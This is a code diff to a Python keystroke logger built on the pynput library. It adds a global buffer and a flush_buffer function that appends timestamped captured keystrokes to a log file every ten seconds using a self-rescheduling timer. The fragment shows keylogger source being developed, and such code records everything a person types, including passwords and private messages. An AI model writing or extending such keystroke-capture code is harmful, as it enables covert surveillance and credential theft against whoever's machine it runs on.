@@ -3,6 +3,10 @@
 from pynput import keyboard
 from config.config import LOG_FILE
 from datetime import datetime
+import threading
+
+buffer = ""
+flush_interval = 10  # seconds
 
 def format_key(key):
     """Format special keys to be readable"""
@@ -31,7 +35,15 @@ def format_key(key):
         return special_keys.get(key, f'[{key.name.upper()}]')
     
 def flush_buffer():
-    pass
+    """Write buffer content to log file and clear it."""
+    global buffer
+    if buffer.strip():
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"{timestamp} - {buffer}\n")
+        buffer = ""
+    # Schedule next flush
+    threading.Timer(flush_interval, flush_buffer).start()
 
 def write_log(key):
     key_str = format_key(key)
